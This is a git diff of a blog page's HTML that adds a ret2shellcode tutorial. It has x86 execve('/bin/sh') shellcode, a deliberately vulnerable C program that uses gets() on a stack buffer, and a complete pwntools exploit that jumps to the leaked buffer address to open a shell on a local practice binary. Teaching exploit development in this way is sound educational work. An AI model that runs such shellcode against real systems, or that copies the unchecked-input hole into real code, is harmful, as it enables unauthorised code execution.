@@ -36,7 +36,7 @@
 <meta itemprop="name" content="Basic Stack Based Overflows">
 <meta itemprop="description" content="Overview Stack based buffer overflows are old as fuck. Like I was literally dead when the most advanced techniques for exploiting them were conceived. However pwntools is a exploitation framework that has been around for a much shorter period of time and adds a new level of simplicity which makes exploit development more approachable. Of course there exist a great number of better binary exploitation courses and guides, a few of which I will link in the resources section bellow."><meta itemprop="datePublished" content="2021-07-01T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2021-07-01T00:00:00+00:00" />
-<meta itemprop="wordCount" content="2615">
+<meta itemprop="wordCount" content="3492">
 <meta itemprop="keywords" content="Buffer Overflows,Exploit Development,Stack Based Overflows,pwntools,pentesting,hacking," />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Basic Stack Based Overflows"/>
@@ -592,7 +592,135 @@ target_binary<span style="color:#f92672">.</span>sendline(payload)
 target_binary<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p>The <code>fit</code> or <code>flat</code> function writes the variable value at the specified offset(s), in this case <code>54</code>, and fills the preceeding byte range with garbage padding. This is the same functionality as padding with A bytes, <code>b'A' * bytes_to_before_ret</code>.</p>
 <h2 id="ret2shellcode">ret2shellcode</h2>
-<p>Coming soon &hellip;</p>
+<blockquote>
+<p>What if we have a buffer overflow on the stack but no win function? Where can we go?</p>
+</blockquote>
+<p>ret2shellcode is the technique of using the controlled return pointer from a buffer overflow to jump to code we control. The next path of enquire is <em>&ldquo;How do we get the code there?&quot;</em>, in short we place it there ourselves.</p>
+<h3 id="a-note-on-memory-protections">A Note On Memory Protections</h3>
+<p><a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/MemoryProtections.md">Memory protections</a>, which are effectively a set of mitigations put in place by compilers like <code>gcc</code> and kernels like the linux kernel, are a pain for exploit development that we will explore more later on. For now all you need to know is that if the <code>NX</code> (No-Execute) bit or protection is not enabled we can execute code on the stack! You can check the compiler protections put in place on the target binary by running a little tool <code>checksec</code> which is included with pwntools. Usage is:</p>
+<ul>
+<li><code>checksec &lt;binary&gt;</code></li>
+</ul>
+<p>The output will resemble the following:</p>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled           &lt;-- if disabled we can execute code in the stack region
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre><h3 id="shellcode">Shellcode</h3>
+<p>So if we can execute on the stack that means we can place code on the stack, in say a <strong>buffer</strong> we control, and then return to it using our control of the return pointer, but what should this code look like?</p>
+<p><a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/Shellcoding.md">Shellcode</a> is the historic name given to machine code that hackers would use to pop a shell in attacks like this. At a lower level of course machine code is just binary data that the CPU can understand as instructions but if we wind back to higher levels of abstraction machine code is just a string of opcodes. The opcodes themselves correspond to the human readable assembly instructions, a variant of which is featured above. Some really common opcodes you may have seen floating around or certainly will are:</p>
+<ul>
+<li><code>\0xCC</code> SIGTRAP (signal trap code)</li>
+<li><code>\0x90</code> NOP (no operation)</li>
+</ul>
+<p>all of these have assembly equivalents, for example in <code>x86</code> the above correspond to:</p>
+<ul>
+<li><code>int3</code> signal trap code</li>
+<li><code>nop</code> no operation</li>
+</ul>
+<p>Ultimately what this means is we can construct turing complete programs with just opcodes although id rather peel my eyes out with a spoon. Which on a happy note brings us back to pwntools our binary exploitation lord and saviour. The <code>asm()</code> function is truly a gift and puts the fun back into constructing shellcode to pop a shell (which we would otherwise do with opcodes). The function lets us supply <code>x86</code> instructions which will then be converted into a opcode string that we can place on the stack (in this case) to execute our code.</p>
+<p>The following python fragment demonstrates its usage to craft shellcode that will execute the syscall for <code>exceve('/bin/sh')</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    xor eax, eax
+</span><span style="color:#e6db74">    push eax     
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    push 0x68732f2f   
+</span><span style="color:#e6db74">    push 0x6e69622f 
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    mov ebx, esp   
+</span><span style="color:#e6db74">    push eax
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    push ebx
+</span><span style="color:#e6db74">    mov ecx, esp
+</span><span style="color:#e6db74">    mov al, 0xb     
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    int 0x80
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+</code></pre></div><p>Now I know what you are thinking, <em>&ldquo;Do I need to be fluent in x86 this dead language from before I walked the face of the high level language earth?&quot;</em>. Sort of ? No not really &hellip;</p>
+<p>A lot of the time we don&rsquo;t need to do anything too wild with our shellcode for example you can see that even a small fragment like the one above is enough to give us a shell on the system. More complex shellcode may open a file and write its contents into a buffer on the stack which we then read from.</p>
+<h3 id="writing-an-exploit-with-shellcode">Writing an Exploit With Shellcode</h3>
+<p>Now lets take a look at a simple ret2shellcode challenge. The reason it is <strong>simple</strong> is because the address of the buffer on the stack that we will place our shellcode into is leaked by the binary. In harder ret2shellcode challenges you may need to leak the buffer address yourself, with say a format string vuln (which we will explore soon), or guess its location.</p>
+<h4 id="c-source">C Source</h4>
+<ul>
+<li>This is the source code for the challenge</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> 
+<span style="color:#a6e22e">hack_me</span>()
+{
+    <span style="color:#75715e">// chonk
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">200</span>];
+
+    printf(<span style="color:#e6db74">&#34;Hit me with your best shot @%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>buffer);
+    gets(<span style="color:#f92672">&amp;</span>buffer);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> 
+<span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>argv[])
+{   
+    hack_me();
+    printf(<span style="color:#e6db74">&#34;Mission failed&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>When we run the compiled program we receive the following output:</p>
+<pre><code>Hit me with your best shot @0xffdacae8
+
+</code></pre><p>with an input prompt on the next line. The hex after the @ corresponds to the buffers address on the stack.</p>
+<h4 id="exploit">Exploit</h4>
+<p>An example exploit for the above binary could be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+proc <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2shellcode&#39;</span>)
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Receiving banner...&#34;</span>)
+proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;@&#34;</span>)
+
+buffer_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Buffer address: &#34;</span> <span style="color:#f92672">+</span> hex(buffer_addr))
+
+<span style="color:#75715e"># attach debugger to see in gdb</span>
+<span style="color:#75715e"># gdb.attach(proc) </span>
+
+shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    xor eax, eax
+</span><span style="color:#e6db74">    xor ebx, ebx
+</span><span style="color:#e6db74">    xor ecx, ecx
+</span><span style="color:#e6db74">    xor edx, edx
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    push eax     
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    push 0x68732f2f   
+</span><span style="color:#e6db74">    push 0x6e69622f 
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    mov ebx, esp   
+</span><span style="color:#e6db74">    push eax
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    push ebx
+</span><span style="color:#e6db74">    mov ecx, esp
+</span><span style="color:#e6db74">    mov eax, 0xb     
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    int 0x80
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+
+<span style="color:#75715e"># send overflow to test offset to return</span>
+<span style="color:#75715e">#overflow = cyclic(350)</span>
+offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">&#34;daac&#34;</span>)
+
+payload <span style="color:#f92672">=</span> fit({
+    <span style="color:#ae81ff">0</span>: shellcode,
+    offset: p32(buffer_addr)
+})
+
+proc<span style="color:#f92672">.</span>sendline(payload)
+proc<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>I highly recommend stepping through the exploit with gdb attached and observing how the flow of the program changes to the buffer and watching as the instructions we placed get executed one by one.</p>
 <h2 id="resources">Resources</h2>
 <ul>
 <li><a href="https://guyinatuxedo.github.io">Nightmare</a></li>
@@ -632,7 +760,7 @@ target_binary<span style="color:#f92672">.</span>interactive()
                     <line x1="16" y1="17" x2="8" y2="17"></line>
                     <polyline points="10 9 9 9 8 9"></polyline>
                 </svg>
-                2615 Words
+                3492 Words
             </p>
   		</div>
         
@@ -651,8 +779,8 @@ target_binary<span style="color:#f92672">.</span>interactive()
 
                         
                             <span class="button next">
-                              <a href="https://cybernetic.coffee/blog/web-app-testing-methodologies/">
-                                <span class="button__text">Web Application Testing Methodologies</span>
+                              <a href="https://cybernetic.coffee/blog/full-web-stacks-2021-and-beyond/">
+                                <span class="button__text">Full Web Stacks: What I&#39;m Using In 2021 &amp; Beyond</span>
                                 <span class="button__icon">→</span>
                               </a>
                             </span>
